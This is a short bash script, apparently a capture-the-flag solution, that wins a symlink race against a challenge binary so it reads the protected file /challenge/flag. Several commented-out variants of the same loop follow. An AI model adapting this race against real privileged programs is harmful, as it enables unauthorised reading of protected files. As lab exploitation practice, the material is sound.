#!/bin/bash

echo dummy > /tmp/du/dummy

while true;
do
  ln -sf /tmp/du/dummy /tmp/du/sl
  echo "/tmp/du/sl" | /challenge/challenge > /tmp/du/tmp &
  ln -sf /challenge/flag /tmp/du/sl
  OUTPUT=$(cat /tmp/du/tmp)
  wait
  echo $OUTPUT

  if echo $OUTPUT | grep -i 'SSof'; then
    echo "====="
    echo $OUTPUT
    break
  fi
done


## witout grep

while true;
do
  ln -sf /tmp/du/dummy /tmp/du/sl
  echo "/tmp/du/sl" | /challenge/challenge &
  ln -sf /challenge/flag /tmp/du/sl
done

# ln -sf /tmp/name /tmp/mymy; (echo /tmp/mymy | ./challenge | grep SSof)& ln -sf flag /tmp/mymy

# while true; do ln -sf /tmp/name /tmp/mymy; (echo /tmp/mymy | /challenge/challenge | grep -i ssof) >> /tmp/du/out & ln -sf /challenge/flag /tmp/mymy; done

# while true; do ln -sf /tmp/name /tmp/mymy; (echo /tmp/mymy | /challenge/challenge | grep -i ssof) >> /tmp/du/out & ln -sf /challenge/flag /tmp/mymy; done

#  ho olare > /tmp/name; ln -sf /tmp/name /tmp/mymy; ./challenge <<< /tmp/mymy & rm /tmp/mymy;ln -s flag /tmp/mymy &
